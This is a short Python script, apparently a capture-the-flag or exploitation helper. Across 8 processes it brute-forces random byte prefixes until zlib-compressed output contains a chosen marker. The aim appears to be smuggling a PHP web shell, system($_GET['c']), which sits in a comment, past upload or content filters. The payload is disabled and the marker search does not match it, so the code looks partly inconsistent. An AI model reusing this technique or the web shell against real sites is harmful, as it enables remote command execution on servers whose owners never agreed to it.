from zlib import compress
import random
import multiprocessing as mp



def gen(n): # Generate random bytes in the BMP
    rand_bytes = b''
    for i in range(n):
        rand_bytes = rand_bytes + chr(random.randrange(0, 65535)).encode('utf8', 'surrogatepass')
    return rand_bytes

def attack():
    while True:
        for i in range(1,2000):
            rand_bytes = gen(i)
            to_compress = b''#b"<?php system($_GET['c']);?>"
            to_compress =  rand_bytes +  to_compress # Random bytes are prepended to our payload. We include the dates: there will be compressed too.
            compressed = compress(to_compress)
            if b'<=/*' in compressed: # Check whether the input is in the output
                    print(to_compress)

if __name__ == "__main__":
    processes = [mp.Process(target=attack) for x in range(8)]

    for p in processes:
        p.start()
